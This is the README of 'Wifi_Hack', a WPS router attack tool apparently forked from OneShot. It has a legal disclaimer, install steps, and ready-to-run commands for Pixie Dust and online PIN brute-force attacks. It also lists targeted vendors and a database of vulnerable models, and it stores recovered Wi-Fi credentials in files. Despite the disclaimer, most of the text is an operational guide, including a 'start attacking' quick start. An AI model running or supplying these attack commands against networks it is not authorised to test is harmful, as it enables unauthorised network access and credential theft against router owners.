# Wifi_Hack

A powerful WPS (Wi-Fi Protected Setup) penetration testing tool for security research and network auditing. This tool helps security professionals test the vulnerability of WPS-enabled routers using Pixie Dust attacks and online brute-force methods.

<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**

This tool is designed for security research and penetration testing on networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal and punishable by law. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

## ✨ Features

- 🎯 **Pixie Dust Attack** - Exploits weak WPS implementations
- 🔓 **Smart Brute Force** - Intelligent PIN guessing with session management
- 📡 **Network Scanner** - Detects WPS-enabled networks with vulnerability indicators
- 🔐 **30+ PIN Algorithms** - Supports vendor-specific PIN generation (D-Link, ASUS, TP-Link, etc.)
- 💾 **Session Recovery** - Resume interrupted brute-force attacks
- 📊 **Result Storage** - Saves credentials in CSV/TXT format
- 🔍 **Vulnerability Database** - Built-in list of 142+ vulnerable router models

## 📋 Requirements

### Hardware
- Rooted Android device with Termux **OR** Linux system
- Compatible wireless adapter supporting monitor mode

### Software
- Python 3.6 or higher
- Root access (`su` or `tsu`)
- Required packages: `wpa-supplicant`, `pixiewps`, `iw`

## 🚀 Installation

### Method 1: Automated Installation (Recommended)

```bash
# Update packages
pkg update && pkg upgrade

# Install basic dependencies
pkg install git python

# Clone the installer
git clone https://github.com/Mahfuz-THBD/Wifi_Hack_Installer
cd Wifi_Hack_Installer

# Run installer
python rianIntaller.py
```

### Method 2: Manual Installation

```bash
# Update system
apt update && apt upgrade

# Install root repository
pkg install -y root-repo

# Install all dependencies
pkg install -y git tsu python wpa-supplicant pixiewps iw

# Clone the repository
git clone https://github.com/Mahfuz-THBD/Wifi_Hack
cd Wifi_Hack

# Set permissions
chmod +x rianHack.py

# Verify installation
sudo python rianHack.py --help
```

## 📖 Usage

### Basic Commands

**Scan networks and launch Pixie Dust attack:**
```bash
sudo python rianHack.py -i wlan0 -K
```

**Attack specific BSSID with Pixie Dust:**
```bash
sudo python rianHack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
```

**Online brute-force attack:**
```bash
sudo python rianHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B
```

**Brute-force with known first half of PIN:**
```bash
sudo python rianHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
```

**Test specific PIN:**
```bash
sudo python rianHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -p 12345670
```

### Advanced Options

```bash
sudo python rianHack.py [OPTIONS]

Required Arguments:
  -i, --interface <wlan0>     Wireless interface name

Optional Arguments:
  -b, --bssid <MAC>           Target AP BSSID
  -p, --pin <PIN>             Specific WPS PIN to test
  -K, --pixie-dust            Run Pixie Dust attack
  -B, --bruteforce            Run online brute-force attack
  -d, --delay <seconds>       Delay between PIN attempts
  -w, --write                 Save credentials to file
  -F, --pixie-force           Force full Pixiewps range
  -X, --show-pixie-cmd        Display Pixiewps command
  -l, --loop                  Continuous scanning mode
  -r, --reverse-scan          Reverse network list order
  -v, --verbose               Enable verbose output
  --iface-down                Down interface when finished
  --vuln-list <file>          Custom vulnerable devices list
```

## 🔧 Troubleshooting

### Common Issues

**"Device or resource busy (-16)"**
```bash
# Solution: Toggle WiFi
# 1. Turn WiFi ON
# 2. Turn WiFi OFF
# 3. Run the script again
```

**"wpa_supplicant: command not found"**
```bash
pkg install -y wpa-supplicant
```

**"Permission denied"**
```bash
# Ensure you have root access
su
# OR
tsu
```

**Interface not found**
```bash
# List available interfaces
ip link show
# OR
iw dev
```

## 📁 Project Structure

```
Wifi_Hack/
├── rianHack.py          # Main attack script (1,193 lines)
├── rianIntaller.py      # Automated installation script
├── README.md            # Documentation
└── vulnwsc.txt          # Vulnerable devices database (142+ models)
```

## 🎯 Attack Modes Explained

### Pixie Dust Attack (`-K`)
- **Speed**: Fast (seconds to minutes)
- **Success Rate**: High on vulnerable devices
- **Method**: Exploits weak random number generation in WPS
- **Best For**: Quick testing of known vulnerable routers

### Brute Force Attack (`-B`)
- **Speed**: Slow (hours to days)
- **Success Rate**: Depends on rate limiting
- **Method**: Systematically tries all possible PINs
- **Best For**: Targets without Pixie Dust vulnerability

## 🛡️ Supported Vendors

The tool includes PIN generation algorithms for:
- TP-Link
- D-Link
- ASUS
- Netgear
- Belkin
- Cisco
- Broadcom
- Realtek
- Huawei
- Edimax
- And many more...

## 📊 Output Files

Successful attacks save credentials to:
- `reports/stored.txt` - Human-readable format
- `reports/stored.csv` - Spreadsheet format
- `~/.BiRi/sessions/` - Brute-force session data
- `~/.BiRi/pixiewps/` - Calculated PINs

## 🤝 Credits

**Original Developer**: rofl0r (OneShotPin)  
**Modified By**: THBD (BiRi_B@B@)  
**Telegram**: [@termux_hacker_bd](https://t.me/termux_hacker_bd)

## 📜 License

This project is open source and available for educational purposes.

## ⚡ Quick Start Example

```bash
# 1. Install (one-time setup)
pkg update && pkg install -y git python
git clone https://github.com/Mahfuz-THBD/Wifi_Hack
cd Wifi_Hack

# 2. Run automated installer
python rianIntaller.py

# 3. Start attacking (from home directory)
cd ~
sudo python Wifi_Hack/rianHack.py -i wlan0 -K
```

---

**Note**: Always turn OFF your WiFi before running the script to avoid interface conflicts.

**Repository**: [https://github.com/Mahfuz-THBD/Wifi_Hack](https://github.com/Mahfuz-THBD/Wifi_Hack)
